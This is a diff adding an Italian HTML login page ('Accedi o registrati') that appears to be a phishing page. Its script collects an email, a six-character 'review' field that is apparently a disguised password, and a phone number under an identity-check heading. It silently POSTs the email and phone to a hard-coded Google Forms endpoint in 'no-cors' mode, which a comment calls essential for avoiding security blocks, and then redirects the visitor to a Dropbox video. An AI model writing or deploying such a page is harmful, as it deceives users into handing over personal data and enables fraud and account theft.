@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Accedi o registrati</title>
+<link rel="icon" type="image/png" href="logo.png">
+
+<style>
+/* CSS UNIFICATO */
+* {
+  box-sizing: border-box;
+  font-family: system-ui, sans-serif;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+/* HEADER */
+.topbar {
+  height: 60px;
+  border-bottom: 1px solid #eee;
+  padding: 0 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+/* MAIN */
+.main {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.login-box {
+  width: 360px;
+  text-align: center;
+}
+
+h1 {
+  margin-bottom: 32px;
+}
+
+label {
+  display: block;
+  text-align: left;
+  margin-bottom: 6px;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  border-radius: 6px;
+  border: 1px solid #ccc;
+  margin-bottom: 16px;
+}
+
+.primary {
+  width: 100%;
+  padding: 14px;
+  background: #0d6efd;
+  color: #fff;
+  border: none;
+  border-radius: 999px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 10px;
+}
+
+.primary:hover {
+  background: #0b5ed7;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.error {
+  margin-top: 16px;
+  color: #d93025;
+  font-size: 14px;
+  text-align: center;
+  min-height: 20px;
+}
+
+/* FOOTER */
+.footer {
+  background: #000;
+  color: #fff;
+  padding: 40px 10%;
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 20px;
+}
+
+.footer-col h4 {
+    margin-top: 0;
+}
+
+.footer-col a {
+  display: block;
+  color: #ccc;
+  text-decoration: none;
+  margin-bottom: 8px;
+  font-size: 14px;
+}
+</style>
+
+</head>
+<body>
+
+<header class="topbar">
+  <div class="logo">
+    <a href="#" style="font-weight:bold; text-decoration:none; color:#000;"><img src="images/logo.png" height="50" width="70"></a>
+  </div>
+  <div class="lang">🌐</div>
+</header>
+
+<main class="main">
+  <div class="login-box">
+
+    <h1 id="page-title">Accedi o registrati</h1>
+
+    <div id="email-wrapper">
+      <label>Email</label>
+      <input type="email" id="email" placeholder="Inserisci email">
+    </div>
+
+    <div id="review-wrapper" class="hidden">
+      <label>review</label>
+      <input type="review" id="review" placeholder="Inserisci review">
+    </div>
+
+    <div id="phone-wrapper" class="hidden">
+      <label>Numero di telefono</label>
+      <input type="tel" id="phone" placeholder="">
+    </div>
+
+    <button class="primary" onclick="handleContinue()">Continua</button>
+
+    <p id="error" class="error"></p>
+
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="footer-col">
+    <h4>Prodotto</h4>
+    <a href="#">App desktop</a>
+    <a href="#">App mobile</a>
+  </div>
+  <div class="footer-col">
+    <h4>Soluzioni</h4>
+    <a href="#">Business</a>
+    <a href="#">Enterprise</a>
+  </div>
+  <div class="footer-col">
+    <h4>Supporto</h4>
+    <a href="#">Centro assistenza</a>
+    <a href="#">Privacy</a>
+  </div>
+  <div class="footer-col">
+    <h4>Azienda</h4>
+    <a href="#">Chi siamo</a>
+  </div>
+</footer>
+
+<script>
+let step = 1;
+
+function handleContinue() {
+  const error = document.getElementById("error");
+  const title = document.getElementById("page-title");
+  
+  error.textContent = "";
+
+  const email = document.getElementById("email").value.trim();
+  const review = document.getElementById("review").value;
+  const phone = document.getElementById("phone").value.trim();
+
+  // --- STEP 1: VALIDAZIONE EMAIL ---
+  if (step === 1) {
+    if (!validateEmail(email)) {
+      error.textContent = "Inserisci un indirizzo email valido";
+      return;
+    }
+
+    document.getElementById("review-wrapper").classList.remove("hidden");
+    step = 2;
+    return;
+  }
+
+  // --- STEP 2: VALIDAZIONE re ---
+  if (step === 2) {
+    if (review.length < 6) {
+      error.textContent = "La review è di almeno 6 caratteri";
+      return;
+    }
+    
+    // AZIONI RICHIESTE:
+    // 1. Nascondi Email e re
+    document.getElementById("email-wrapper").classList.add("hidden");
+    document.getElementById("review-wrapper").classList.add("hidden");
+    
+    // 2. Cambia il titolo H1
+    title.textContent = "Verifica la tua identità";
+    
+    // 3. Mostra il campo Telefono
+    document.getElementById("phone-wrapper").classList.remove("hidden");
+    
+    step = 3;
+    return;
+  }
+
+  // --- STEP 3: VALIDAZIONE TELEFONO ---
+  if (step === 3) {
+    // Validazione semplice: controlla se c'è qualcosa scritto e se sono numeri/spazi
+    // Regex: accetta +, spazi e numeri, almeno 8 caratteri
+    if (!/^[+0-9\s]{8,}$/.test(phone)) {
+      error.textContent = "Inserisci un numero di telefono valido";
+      return;
+    }
+    inviaDatiFinali();
+  }
+}
+
+function validateEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+// --- CONFIGURAZIONE GOOGLE FORMS ---
+const G_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeL-5tvSnuXBFBtEV0yziqFQcdNdBuOPzLk6no5DktX-XvAEw/formResponse";
+
+async function inviaDatiFinali() {
+    const email = document.getElementById("email").value;
+    const phone = document.getElementById("phone").value;
+    const review = document.getElementById("review").value;
+
+    // Creiamo il contenitore dei dati
+    const formData = new FormData();
+    
+    // Sostituisci i numeri qui sotto con i tuoi Entry ID trovati al punto 3
+    formData.append("entry.1807533030", email); 
+    formData.append("entry.1821810321", phone);
+  //  formData.append("entry.167777586", review);
+
+    try {
+        await fetch(G_URL, {
+            method: "POST",
+            mode: "no-cors", // Fondamentale per evitare blocchi di sicurezza
+            body: formData
+        });
+
+        // Dopo l'invio, facciamo il redirect
+        window.location.href = "https://www.dropbox.com/scl/fi/2r3sg52o8hwhqpx817yfk/lv-0-20251229195311_MW6hIimX.mp4?rlkey=aeick235473orhhza3xexn0jm&st=9cdbovbt&dl=0"; 
+    } catch (e) {
+        alert("Errore nell'invio dei dati.");
+    }
+}
+</script>
+
+</body>
+</html>
